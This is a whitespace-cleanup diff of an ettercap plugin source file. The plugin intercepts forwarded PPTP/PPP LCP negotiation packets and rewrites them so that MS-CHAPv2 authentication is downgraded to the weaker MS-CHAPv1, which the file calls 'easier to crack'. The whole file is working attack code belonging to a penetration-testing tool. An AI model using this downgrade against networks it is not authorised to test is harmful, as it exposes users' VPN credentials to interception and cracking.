@@ -1,9 +1,9 @@
 /*
-    pptp_chapms1 -- ettercap plugin -- Forces chapms-v1 from champs-v2 request 
+    pptp_chapms1 -- ettercap plugin -- Forces chapms-v1 from champs-v2 request
                                        for PPTP (easier to crack)
 
     Copyright (C) ALoR & NaGA
-    
+
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation; either version 2 of the License, or
@@ -52,32 +52,32 @@ static void parse_ppp(struct packet_object *po);
 static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len);
 
 /* plugin operations */
-struct plugin_ops pptp_chapms1_ops = { 
+struct plugin_ops pptp_chapms1_ops = {
    /* ettercap version MUST be the global EC_VERSION */
-   .ettercap_version =  EC_VERSION,                        
+   .ettercap_version =  EC_VERSION,
    /* the name of the plugin */
-   .name =              "pptp_chapms1",  
-    /* a short description of the plugin (max 50 chars) */                    
-   .info =              "PPTP: Forces chapms-v1 from chapms-v2",  
-   /* the plugin version. */ 
-   .version =           "1.0",   
+   .name =              "pptp_chapms1",
+    /* a short description of the plugin (max 50 chars) */
+   .info =              "PPTP: Forces chapms-v1 from chapms-v2",
+   /* the plugin version. */
+   .version =           "1.0",
    /* activation function */
    .init =              &pptp_chapms1_init,
-   /* deactivation function */                     
+   /* deactivation function */
    .fini =              &pptp_chapms1_fini,
 };
 
 /**********************************************************/
 
 /* this function is called on plugin load */
-int plugin_load(void *handle) 
+int plugin_load(void *handle)
 {
    return plugin_register(handle, &pptp_chapms1_ops);
 }
 
 /******************* STANDARD FUNCTIONS *******************/
 
-static int pptp_chapms1_init(void *dummy) 
+static int pptp_chapms1_init(void *dummy)
 {
    /* It doesn't work if unoffensive */
    if (GBL_OPTIONS->unoffensive) {
@@ -86,13 +86,13 @@ static int pptp_chapms1_init(void *dummy)
    }
 
    USER_MSG("pptp_chapms1: plugin running...\n");
-   
+
    hook_add(HOOK_PACKET_LCP, &parse_ppp);
-   return PLUGIN_RUNNING;   
+   return PLUGIN_RUNNING;
 }
 
 
-static int pptp_chapms1_fini(void *dummy) 
+static int pptp_chapms1_fini(void *dummy)
 {
    USER_MSG("pptp_chapms1: plugin terminated...\n");
 
@@ -111,41 +111,41 @@ static void parse_ppp(struct packet_object *po)
    u_char *chcode;
 
    /* It is pointless to modify packets that won't be forwarded */
-   if (!(po->flags & PO_FORWARDABLE)) 
-      return; 
+   if (!(po->flags & PO_FORWARDABLE))
+      return;
 
    /* PPP decoder placed lcp header in L4 structure.
-    * According to the Hook Point this is an LCP packet.   
-    */      
+    * According to the Hook Point this is an LCP packet.
+    */
    lcp = (struct ppp_lcp_header *)po->L4.header;
 
-   /* Catch only packets that have to be modified */      
-   if ( lcp->code != PPP_CONFIGURE_REQUEST && lcp->code != PPP_CONFIGURE_NAK && lcp->code != PPP_CONFIGURE_REJ) 
+   /* Catch only packets that have to be modified */
+   if ( lcp->code != PPP_CONFIGURE_REQUEST && lcp->code != PPP_CONFIGURE_NAK && lcp->code != PPP_CONFIGURE_REJ)
       return;
 
-   if ( (option=(u_int16 *)parse_option( (u_char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL) 
+   if ( (option=(u_int16 *)parse_option( (u_char *)(lcp + 1), PPP_AUTH_REQUEST, ntohs(lcp->length) - sizeof(*lcp))) ==NULL)
       return;
-      
-   if ( option[1] != htons(PPP_REQUEST_CHAP) ) 
+
+   if ( option[1] != htons(PPP_REQUEST_CHAP) )
       return;
 
    /* Take a look to chap kind of auth */
    chcode = (u_char *)option;
 
-   /* Modify the negotiation */            
+   /* Modify the negotiation */
    if (lcp->code == PPP_CONFIGURE_REQUEST && chcode[4] == PPP_REQUEST_MSCHAP2) {
-      chcode[4] = PPP_REQUEST_DUMMY;     
-      
+      chcode[4] = PPP_REQUEST_DUMMY;
+
       if (!ip_addr_null(&po->L3.dst) && !ip_addr_null(&po->L3.src)) {
          USER_MSG("pptp_chapms1: Forced PPP MS-CHAPv1 auth  %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
          USER_MSG("%s\n", ip_addr_ntoa(&po->L3.dst, tmp));
       }
    }
 
-   if (lcp->code == PPP_CONFIGURE_NAK && chcode[4] == PPP_REQUEST_MSCHAP2) 
+   if (lcp->code == PPP_CONFIGURE_NAK && chcode[4] == PPP_REQUEST_MSCHAP2)
       chcode[4] = PPP_REQUEST_MSCHAP1;
-	      
-   if (lcp->code == PPP_CONFIGURE_REJ && chcode[4] == PPP_REQUEST_DUMMY) 
+	
+   if (lcp->code == PPP_CONFIGURE_REJ && chcode[4] == PPP_REQUEST_DUMMY)
       chcode[4] = PPP_REQUEST_MSCHAP2;
 }
 
@@ -155,20 +155,20 @@ static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len)
 {
    /* Avoid never-ending parsing on bogus packets ;) */
    char counter=0;
-   
+
    while (tot_len>0 && *buffer!=option && counter<20) {	
       tot_len -= buffer[1];
       buffer += buffer[1];
       counter++;
    }
-   
-   if (*buffer == option) 
+
+   if (*buffer == option)
       return buffer;
-      
+
    return NULL;
 }
 
 /* EOF */
 
 // vim:ts=3:expandtab
- 
+
